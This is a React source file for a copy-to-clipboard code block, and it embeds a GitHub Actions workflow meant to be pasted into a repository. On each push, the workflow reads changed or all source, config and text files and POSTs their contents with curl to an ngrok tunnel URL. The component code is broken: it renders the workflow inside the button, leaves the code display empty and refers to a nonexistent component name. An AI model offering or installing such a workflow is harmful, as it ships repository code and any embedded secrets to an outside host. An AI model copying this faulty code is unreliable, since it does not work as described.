import React, { useState, useRef } from 'react';

// This is a reusable component for displaying a block of code with a copy button.
// Props:
// - codeString: The string of code you want to display.
const CopyableCode = ({ codeString }) => {
  const [buttonText, setButtonText] = useState('Copy');
  const codeRef = useRef(null);
const workflowCode = `
name: Send Files to Server

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  send_files:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v3
        with:
          fetch-depth: 2

      - name: Get changed files
        id: files
        run: |
          echo "=== Getting changed files ==="
          if [ "\${{ github.event.before }}" = "0000000000000000000000000000000000000000" ] || [ -z "\${{ github.event.before }}" ]; then
            echo "First push or no previous commit - getting all files"
            CHANGED_FILES=$(find . -type f \\( -name "*.js" -o -name "*.jsx" -o -name "*.ts" -o -name "*.tsx" -o -name "*.json" -o -name "*.py" -o -name "*.txt" -o -name "*.md" \\) -not -path './.git/*' | tr '\\n' ' ')
          else
            echo "Regular push - getting changed files"
            CHANGED_FILES=$(git diff --name-only \${{ github.event.before }} \${{ github.sha }} | tr '\\n' ' ')
            
            if [ -z "$CHANGED_FILES" ]; then
              echo "Git diff returned nothing, trying alternative method"
              CHANGED_FILES=$(git diff --name-only HEAD~1 HEAD | tr '\\n' ' ')
            fi
            
            if [ -z "$CHANGED_FILES" ]; then
              echo "Still nothing, getting files from last commit"
              CHANGED_FILES=$(git show --pretty="" --name-only HEAD | tr '\\n' ' ')
            fi
          fi

          CHANGED_FILES=$(echo $CHANGED_FILES | xargs)
          echo "CHANGED_FILES=$CHANGED_FILES" >> $GITHUB_ENV
          echo "Detected files: '$CHANGED_FILES'"

          if [ -z "$CHANGED_FILES" ]; then
            echo "HAS_FILES=false" >> $GITHUB_ENV
          else
            echo "HAS_FILES=true" >> $GITHUB_ENV
          fi

      - name: Send changed files to server
        if: env.HAS_FILES == 'true'
        run: |
          echo "=== Sending files to server ==="
          for file in $CHANGED_FILES; do
            echo ""
            echo "---- Processing: $file ----"
            if [ ! -f "$file" ]; then
              echo "⚠️  File $file doesn't exist, skipping"
              continue
            fi

            echo "File info:"
            file "$file" || echo "Cannot determine file type"

            echo "Reading and converting file content..."
            if command -v iconv >/dev/null 2>&1; then
              CONTENT=$(iconv -f UTF-16 -t UTF-8 "$file" 2>/dev/null | jq -Rs .) || \
              CONTENT=$(iconv -f UTF-16LE -t UTF-8 "$file" 2>/dev/null | jq -Rs .) || \
              CONTENT=$(cat "$file" | jq -Rs .)
            else
              CONTENT=$(cat "$file" | jq -Rs .)
            fi

            if [ $? -ne 0 ]; then
              echo "❌ Failed to read content for $file"
              continue
            fi

            JSON_PAYLOAD=$(jq -n \
              --arg file_path "$file" \
              --argjson content "$CONTENT" \
              '{file_path: $file_path, content: $content}')

            echo "Sending to server..."
            HTTP_RESPONSE=$(curl -s -w "\\nHTTP_STATUS:%{http_code}" -X POST \
              https://5c6e510e6b7a.ngrok-free.app/inputCode \
              -H "Content-Type: application/json" \
              -H "ngrok-skip-browser-warning: true" \
              -d "$JSON_PAYLOAD")

            HTTP_STATUS=$(echo "$HTTP_RESPONSE" | tail -n1 | cut -d: -f2)
            RESPONSE_BODY=$(echo "$HTTP_RESPONSE" | sed '$d')

            echo "::set-output name=response_body::/$/{RESPONSE_BODY}"

            echo "HTTP Status: $HTTP_STATUS"
            echo "Server response: $RESPONSE_BODY"

            if [ "$HTTP_STATUS" = "200" ]; then
              echo "✅ Successfully sent $file"
            else
              echo "❌ Failed to send $file (HTTP $HTTP_STATUS)"
            fi
            echo "------------------------"
          done
`;
  const handleCopy = () => {
    // Using a textarea element to hold the text and copy it
    const textArea = document.createElement('textarea');
    textArea.value = codeString;
    document.body.appendChild(textArea);
    textArea.select();
    
    try {
      // Use the older document.execCommand('copy') for broader browser/iframe support
      document.execCommand('copy');
      setButtonText('Copied!');
    } catch (err) {
      console.error('Failed to copy text: ', err);
      setButtonText('Failed!');
    }
    
    document.body.removeChild(textArea);

    // Reset button text after a short delay
    setTimeout(() => {
      setButtonText('Copy');
    }, 2000);
  };

  return (
    <div className="bg-gray-900 text-white rounded-lg font-mono text-sm my-4 overflow-hidden">
      {/* <div className = "'text-primary font-semibold items-center text-center">Copy this code</div> */}
      <div className="flex justify-between items-center px-4 py-2 bg-gray-800">
        <span className="text-gray-400">Example Code</span>
        <button
          onClick={handleCopy}
          className="bg-gray-700 hover:bg-gray-600 text-white font-semibold py-1 px-3 rounded-md text-xs transition-colors duration-200"
        >
          {workflowCode}
          {buttonText}
        </button>
      </div>
      <pre className="p-4 overflow-x-auto" ref={codeRef}>
        
      </pre>
    </div>
  );
};

// --- Example Usage ---
// You would use this component in your main App like this:

/*
export default function App() {
  const exampleCode = `const greet = () => {
  console.log("Hello, World!");
};

greet();`;

  return (
    <div className="p-8 bg-gray-100 min-h-screen">
      <h1 className="text-2xl font-bold mb-4">React Code Copy Component</h1>
      <p>Here's how you can use the component:</p>
      <CodeCopyBlock codeString={exampleCode} />

      <p>Here is another example with a different code snippet:</p>
      <CodeCopyBlock codeString={'npm install react'} />
    </div>
  );
}
*/

export default CopyableCode;
